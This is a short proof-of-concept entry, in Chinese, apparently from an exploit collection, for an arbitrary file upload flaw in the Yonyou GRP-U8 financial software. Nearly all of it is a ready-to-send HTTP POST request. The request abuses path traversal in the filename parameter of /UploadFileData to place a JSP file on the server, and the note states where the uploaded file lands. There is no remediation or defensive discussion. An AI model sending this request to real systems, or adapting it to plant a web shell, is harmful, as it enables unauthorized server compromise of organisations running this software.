## 用友GRP-U8-UploadFileData任意文件上传


## poc
```
POST /UploadFileData?action=upload_file&filename=../.jtstpm.jsp HTTP/1.0
Host: xxxxxx
Connection: close
Content-Length: 327
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzassocxz
Cookie: JSESSIONID=0333BDE70A73627168772D5C50956A74
Dfpajaxreq: 1.0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

------WebKitFormBoundaryzassocxz
Content-Disposition: form-data; name="upload"; filename="jtstpm.jsp"
Content-Type: application/octet-stream

11111
------WebKitFormBoundaryzassocxz
Content-Disposition: form-data; name="submit"

submit
------WebKitFormBoundaryzassocxz--
```

文件路径 /R9iPortal/jtstpm.jsp
